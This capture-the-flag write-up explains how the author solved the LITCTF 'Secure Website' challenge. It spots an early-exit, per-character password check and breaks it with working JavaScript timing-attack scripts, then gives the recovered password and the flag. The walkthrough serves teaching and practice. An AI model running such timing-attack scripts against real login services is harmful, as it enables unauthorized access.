# web/Secure Website

## Challenge

I have like so many things that I want to do, but I am not sure if I want others to see them yet D: I guess I will just hide all the super important stuff behind my super super fortified and secure [Password Checker](http://litctf.live:31776/)!

[SecureWebsite.zip](https://drive.google.com/uc?export=download&id=1ixlV54JoFOGziLzlOewPBijbtePZo8SI)

## Solution

### Analysis

This is an interesting one! Looking in `main.js`, we see our main and only target:
```js
var flag = (process.env.FLAG ?? "ctf{flag}");
// I like alphanumeric passwords
var password = (process.env.password ?? "password");

/* ... standard Express.js stuff */

app.get('/verify', (req, res) => {
	var pass = req.query.password;
	if(pass == undefined || typeof(pass) !== 'string' || !checkPassword(password,pass)) {
		res.writeHead(302, {'Location': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley'});
		res.end();
		return;
	}
	res.render("secret",{flag: flag});
});
```

Hm... to simple and standard to exploit here. We'll look at `checkPassword()` in `passwordChecker.js`:
```js
// I think this is how you're supposed to implement RSA?
// IDK this is a web challenge not a crypto challenge :clown:
// I just picked 2 random prime numbers as the tutorial said
// (Or is it 0_0)

/* ... blah blah some standard RSA code */

function checkPassword(password,pass) {
	var arr = pass.split(",");
	for(var i = 0;i < arr.length;++i) {
		arr[i] = parseInt(arr[i]);
	}

	if(arr.length != password.length) return false;
	for(var i = 0;i < arr.length;++i) {
		var currentChar = password.charCodeAt(i);
		var currentInput = decryptRSA(arr[i]);
		if(currentChar != currentInput) return false;
	}
	return true;
}
```
...well, that's interesting. As the top of the file hints, the RSA decryption is basic and standard, and we're given all public and private values so it's basically pointless.

But it's used weirdly... each _individual_ character is decrypted, one at a time, and the moment there's a mismatch, the function returns `false`. So it's seemingly even more pointless...

Except it seems there's really nowhere to exploit. `pass` must be a string, so we can't inject anything into this function. `NaN` won't break anything either.

But comparing strings character-by-character with an inefficient process that returns as soon as a mismatch is found? This sounds like a <u>timing attack</u>!

### Attack

For reference, how the password is encoded for transmission (`views/index.ejs`):
```js
function submitForm() {
    var pwd = $("#password").val();
    var arr = [];
    for(var i = 0;i < pwd.length;++i) {
        arr.push(encryptRSA(pwd.charCodeAt(i)));
    }
    window.location.href = "/verify?password=" + arr.join();
    return;
}
```
Since `checkPassword()` first checks lengths, we need to find the password length first before guessing characters:
```js
(async () => { // IIFE (to use await) not necessary on Chrome
    for (let i = 1; i <= 10; ++i) {
        const pwd = "a".repeat(i);
        const q = pwd.split("").map(c=>encryptRSA(c.charCodeAt(0))).join(); // arr.join()
        const t = performance.now(); // timing start
        await fetch(`http://litctf.live:31776/verify?password=${q}`, {
            "redirect": "manual", // to ignore the redirect
        });
        console.log(pwd, performance.now()-t); // timing end
        await new Promise(resolve => setTimeout(resolve, 2000)); // timeout to avoid rate limits
    }
})()
```
Rate limits were a bit annoying - they can show up as `429 Too Many Requests`, but they also randomly increase timings with no errors. However, looking at results, it's obvious whether rate limits affected it.

![](./Secure%20Website/timing.png)
Oh, yeah. The first request is always much slower for some reason, but the password isn't gonna be one character, right???

But anyway, hooray! `aaaaaa` has a clear difference! And the rest are almost constant, no need to average trials. We move on:
```js
(async () => {
    for (let c of "AABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz") {
        const pwd = `${c}aaaaa`;
/* the same thing */
```
(The first letter is to avoid the slow first request.)

But yay! `Caaaaa` has a significant difference (~1024 vs ~200), and we move on, testing `C${c}aaaa` and so on. (It's only 6 characters total, so it's not worthy to automate, especially since random outliers rarely appear.)

4 more rounds later (with requests taking longer and longer), we get `CxIj6_`. The last character is tricky, because a success won't mean another character check; instead, we will get sent to the flag!
```js
await (async () => {
    for (let c of "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz") {
        const pwd = `CxIj6${c}`;
        const q = pwd.split("").map(c=>encryptRSA(c.charCodeAt(0))).join();
        try {
            const res = await fetch(`http://litctf.live:31776/verify?password=${q}`, {
                "redirect": "error", // so only the correct one doesn't error
            });
            return await res.text();
        } catch {}
        console.log(pwd, "failed");
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
})()
```
And for `CxIj6p`...
![](./Secure%20Website/secret.png)
Yay!

## Flag

`LITCTF{uwu_st3ph4ni3_i5_s0_0rz_0rz_0TZ}`

## Notes

At first I averaged trials, but then it got painfully slow so I tried just one each and it worked. Also, for the last character, I originally just manually guessed until I got it right! (Lots of rickrolling there...)
